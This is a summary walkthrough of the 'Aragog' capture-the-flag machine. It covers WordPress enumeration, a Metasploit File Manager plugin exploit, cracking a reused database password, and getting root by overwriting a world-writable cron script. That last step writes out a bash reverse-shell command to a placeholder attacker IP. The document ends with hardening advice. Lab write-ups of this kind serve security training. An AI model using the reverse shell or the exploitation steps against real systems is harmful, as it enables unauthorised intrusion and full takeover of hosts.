#  Aragog CTF – Summary Walkthrough  

A full text-based breakdown of the **Aragog vulnerable machine**.  
This challenge demonstrates WordPress exploitation via a vulnerable plugin, horizontal privilege escalation through database credential reuse, and root compromise by abusing insecure cron jobs.  

##  Discovery  
- Ran nmap scan:  
nmap -sV -A <ip>

- Found ports:  
- 80 (HTTP – Web Server)  
- 22 (SSH)  

➡️ Insight: The target exposes a web application and remote SSH access.  

##  Enumeration  
- Ran Gobuster against HTTP service:  
gobuster dir -u http://<ip>/
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-x txt,log,php,html,bak,zip

- Found:  
- `/blog` → Running **WordPress CMS**  
- `/javascript`  

- Extracted target domain name from `/blog` page source and added to `/etc/hosts`.  
- Enumerated WordPress with WPScan:  
wpscan --url http://<ip>/blog
-e vp --plugins-detection mixed
--api-token <token>

- Identified **vulnerable File Manager plugin**.  
- Verified exploit with `searchsploit`.  

✅ WordPress confirmed exploitable.  

##  Foothold  
- Loaded Metasploit and executed File Manager RCE module.  
- Successfully gained shell as **www-data**.  

✅ Initial foothold established.  

## User Escalation (www-data → hagrid98)  
- Uploaded and ran **linpeas.sh** in `/tmp`.  
- Extracted MySQL credentials → logged into database.  
mysql -u <username> -p<password>
SHOW DATABASES;
USE <db>;
SHOW TABLES;
SELECT * FROM <table_name>;

- Retrieved and cracked password hash for user **hagrid98** using John + rockyou.txt.  
- Switched to user account with cracked credentials.  

✅ Access as **hagrid98** achieved.  

##  Privilege Escalation (hagrid98 → root)  
- Uploaded **pspy64.py** to monitor running processes.  
- Observed recurring execution of `/opt/.backup.sh` by root.  
- File was world-writable → modified script to spawn reverse shell:  
```bash
echo '#!/bin/bash' > /opt/.backup.sh
echo 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' >> /opt/.backup.sh
Set up listener → triggered by cron → reverse root shell gained.

✅ Full root compromise achieved 🎉

## Recommendations
WordPress Hardening
Remove unused/vulnerable plugins immediately.

Regularly patch WordPress core, themes, and plugins.

Restrict admin accounts with least privilege.

Deploy WAF to block automated exploit attempts.

Privilege Escalation Prevention
Lock down cron jobs — root-owned scripts must never be world-writable.

Enforce strict permissions (chmod 700).

Monitor scheduled tasks for unusual modifications.

📖 Full walkthrough with screenshots:
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/harry-potter-series-aragog-ctf-full-technical-walkthrough-39bda16f0187)

